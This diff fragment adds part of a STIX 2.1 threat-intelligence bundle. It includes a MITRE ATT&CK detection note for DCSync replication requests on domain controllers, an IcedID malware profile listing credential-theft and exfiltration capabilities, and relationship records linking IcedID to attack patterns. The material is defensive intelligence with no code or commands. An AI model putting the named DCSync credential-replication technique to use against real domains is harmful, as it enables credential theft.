+                "Active Directory: Active Directory Object Access",
+                "Network Traffic: Network Traffic Content",
+                "Network Traffic: Network Traffic Flow"
+            ],
+            "x_mitre_deprecated": false,
+            "x_mitre_detection": "Monitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync.(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) Also monitor for network protocols(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft NRPC Dec 2017) and other replication requests(Citation: Microsoft SAMR) from IPs not associated with known domain controllers.(Citation: AdSecurity DCSync Sept 2015)\n\nNote: Domain controllers may not log replication requests originating from the default domain controller account.(Citation: Harmj0y DCSync Sept 2015)",
+            "x_mitre_domains": [
+                "enterprise-attack"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "x_mitre_version": "1.1",
+            "x_mitre_platforms": [
+                "Windows"
+            ]
+        },
+        {
+            "type": "malware",
+            "spec_version": "2.1",
+            "id": "malware--7ff26fc5-d53d-4eb0-a469-eb72cd617bf0",
+            "created": "2025-02-21T13:06:12.771358Z",
+            "modified": "2025-02-21T13:06:12.771358Z",
+            "name": "IcedID",
+            "malware_types": [
+                "backdoor",
+                "downloader"
+            ],
+            "is_family": true,
+            "capabilities": [
+                "accesses-remote-machines",
+                "exfiltrates-data",
+                "escalates_privileges",
+                "exfiltrates_data",
+                "installs-other-components",
+                "steals-authentication-credentials"
+            ]
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--0284880d-ad4f-44db-8298-128c202cf7c7",
+            "created": "2025-02-21T13:06:12.776734Z",
+            "modified": "2025-02-21T13:06:12.776734Z",
+            "relationship_type": "related-to",
+            "source_ref": "threat-actor--132a4b4b-80cd-49fa-be94-15a44e422e22",
+            "target_ref": "malware--7ff26fc5-d53d-4eb0-a469-eb72cd617bf0"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--724268a3-d272-4849-8cce-223bd6fbf6a2",
+            "created": "2025-02-21T13:06:12.772882Z",
+            "modified": "2025-02-21T13:06:12.772882Z",
+            "relationship_type": "uses",
+            "source_ref": "malware--7ff26fc5-d53d-4eb0-a469-eb72cd617bf0",
+            "target_ref": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--1fc86411-bbd4-4ab6-8cc8-9bd0ac3aab93",
+            "created": "2025-02-21T13:06:12.773289Z",
+            "modified": "2025-02-21T13:06:12.773289Z",
+            "relationship_type": "uses",
+            "source_ref": "malware--7ff26fc5-d53d-4eb0-a469-eb72cd617bf0",
+            "target_ref": "attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--fd87ac97-569f-45fd-9d03-533aa5aae657",
+            "created": "2025-02-21T13:06:12.773498Z",
+            "modified": "2025-02-21T13:06:12.773498Z",
+            "relationship_type": "uses",
+            "source_ref": "malware--7ff26fc5-d53d-4eb0-a469-eb72cd617bf0",
+            "target_ref": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--8027764f-d0e3-4e7e-9f36-e3bbd29b12ae",
+            "created": "2025-02-21T13:06:12.773645Z",
+            "modified": "2025-02-21T13:06:12.773645Z",
+            "relationship_type": "uses",
+            "source_ref": "malware--7ff26fc5-d53d-4eb0-a469-eb72cd617bf0",
+            "target_ref": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--1725ce04-9e16-4891-9e25-86e7f9c9b10d",
+            "created": "2025-02-21T13:06:12.773782Z",
+            "modified": "2025-02-21T13:06:12.773782Z",
+            "relationship_type": "uses",
+            "source_ref": "malware--7ff26fc5-d53d-4eb0-a469-eb72cd617bf0",
+            "target_ref": "attack-pattern--62b8c999-dcc0-4755-bd69-09442d9359f5"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--fc969b0d-b8a3-4210-bf39-8101bf881477",
+            "created": "2025-02-21T13:06:12.773918Z",
+            "modified": "2025-02-21T13:06:12.773918Z",
+            "relationship_type": "uses",
+            "source_ref": "malware--7ff26fc5-d53d-4eb0-a469-eb72cd617bf0",
+            "target_ref": "attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--7e6623eb-5dc4-4141-86e3-11514526de16",
+            "created": "2025-02-21T13:06:12.774051Z",
+            "modified": "2025-02-21T13:06:12.774051Z",
+            "relationship_type": "uses",
+            "source_ref": "malware--7ff26fc5-d53d-4eb0-a469-eb72cd617bf0",
+            "target_ref": "attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--d6922d74-7bcc-4df6-8ba4-3826381484e6",
+            "created": "2025-02-21T13:06:12.774183Z",
+            "modified": "2025-02-21T13:06:12.774183Z",
+            "relationship_type": "uses",
+            "source_ref": "malware--7ff26fc5-d53d-4eb0-a469-eb72cd617bf0",
+            "target_ref": "attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--4eeed28c-4b15-4da6-b342-758a5e443b16",
+            "created": "2025-02-21T13:06:12.774316Z",
+            "modified": "2025-02-21T13:06:12.774316Z",
+            "relationship_type": "uses",
+            "source_ref": "malware--7ff26fc5-d53d-4eb0-a469-eb72cd617bf0",
+            "target_ref": "attack-pattern--b97f1d35-4249-4486-a6b5-ee60ccf24fab"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--b5cb0af5-b551-4547-941b-60ec5bed1289",
+            "created": "2025-02-21T13:06:12.774444Z",
+            "modified": "2025-02-21T13:06:12.774444Z",
+            "relationship_type": "uses",
+            "source_ref": "malware--7ff26fc5-d53d-4eb0-a469-eb72cd617bf0",
+            "target_ref": "attack-pattern--bf1b6176-597c-4600-bfcd-ac989670f96b"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--6b1ae64f-b1b2-4d13-b9be-702b0d2c77a3",
+            "created": "2025-02-21T13:06:12.77467Z",
+            "modified": "2025-02-21T13:06:12.77467Z",
+            "relationship_type": "uses",
+            "source_ref": "malware--7ff26fc5-d53d-4eb0-a469-eb72cd617bf0",
+            "target_ref": "attack-pattern--e358d692-23c0-4a31-9eb6-ecc13a8d7735"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--d422a4ba-48e9-4381-8a73-8a51aaa24ede",
+            "created": "2025-02-21T13:06:12.774807Z",
+            "modified": "2025-02-21T13:06:12.774807Z",
+            "relationship_type": "uses",
+            "source_ref": "malware--7ff26fc5-d53d-4eb0-a469-eb72cd617bf0",
+            "target_ref": "attack-pattern--ec8fc7e2-b356-455c-8db5-2e37be158e7d"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--530ac4c8-58b1-4f65-acce-5532bdd54279",
+            "created": "2025-02-21T13:06:12.774988Z",
+            "modified": "2025-02-21T13:06:12.774988Z",
+            "relationship_type": "uses",
+            "source_ref": "malware--7ff26fc5-d53d-4eb0-a469-eb72cd617bf0",
+            "target_ref": "attack-pattern--f2877f7f-9a4c-4251-879f-1224e3006bee"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--f62cd356-9c86-4a18-80bb-35303308f785",
+            "created": "2025-02-21T13:06:12.775124Z",
+            "modified": "2025-02-21T13:06:12.775124Z",
+            "relationship_type": "uses",
+            "source_ref": "malware--7ff26fc5-d53d-4eb0-a469-eb72cd617bf0",
+            "target_ref": "attack-pattern--f303a39a-6255-4b89-aecc-18c4d8ca7163"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--208cd85c-4b52-4223-ba8b-ce82bc24e309",
+            "created": "2025-02-21T13:06:12.775258Z",
+            "modified": "2025-02-21T13:06:12.775258Z",
+            "relationship_type": "uses",
+            "source_ref": "malware--7ff26fc5-d53d-4eb0-a469-eb72cd617bf0",
+            "target_ref": "malware-behavior--584dc938-3789-4e53-995e-f914dff31b71"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--50819a1e-977a-408b-a453-b0cd2e33ae7c",
+            "created": "2025-02-21T13:06:12.775391Z",
+            "modified": "2025-02-21T13:06:12.775391Z",
+            "relationship_type": "uses",
+            "source_ref": "malware--7ff26fc5-d53d-4eb0-a469-eb72cd617bf0",
+            "target_ref": "malware-behavior--7ea1c41a-ed8b-4836-a4bc-48129c33c60b"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--bda4d586-e0c3-4993-ae81-b6fb38899bf0",
+            "created": "2025-02-21T13:06:12.775521Z",
+            "modified": "2025-02-21T13:06:12.775521Z",
+            "relationship_type": "uses",
+            "source_ref": "malware--7ff26fc5-d53d-4eb0-a469-eb72cd617bf0",
+            "target_ref": "malware-behavior--819ed2ae-7ed5-4caf-a057-485563efc26f"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--7b72b81a-8569-4352-8539-82c037312954",
+            "created": "2025-02-21T13:06:12.775656Z",
+            "modified": "2025-02-21T13:06:12.775656Z",
+            "relationship_type": "uses",
+            "source_ref": "malware--7ff26fc5-d53d-4eb0-a469-eb72cd617bf0",
+            "target_ref": "malware-behavior--201961ae-2a71-41f5-bbd0-8c22bbd748de"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--2a6eecf5-eab5-497a-8a22-f815f5696cab",
+            "created": "2025-02-21T13:06:12.775787Z",
+            "modified": "2025-02-21T13:06:12.775787Z",
+            "relationship_type": "uses",
+            "source_ref": "malware--7ff26fc5-d53d-4eb0-a469-eb72cd617bf0",
+            "target_ref": "malware-behavior--7cb5847c-f662-4260-bd44-857ffd4975da"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--853d09d6-1a39-438a-945d-268035981844",
+            "created": "2025-02-21T13:06:12.775922Z",
+            "modified": "2025-02-21T13:06:12.775922Z",
+            "relationship_type": "uses",
+            "source_ref": "malware--7ff26fc5-d53d-4eb0-a469-eb72cd617bf0",
+            "target_ref": "malware-behavior--a28f7a00-c512-4a1e-88a9-9eeeca8a162a"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--b7ac27d2-2b05-42e2-9c4a-0ea807e0b433",
+            "created": "2025-02-21T13:06:12.77606Z",
+            "modified": "2025-02-21T13:06:12.77606Z",
+            "relationship_type": "uses",
+            "source_ref": "malware--7ff26fc5-d53d-4eb0-a469-eb72cd617bf0",
+            "target_ref": "malware-behavior--c889b142-22b2-4e82-9412-cf5528523f56"
+        }
+    ]
+}
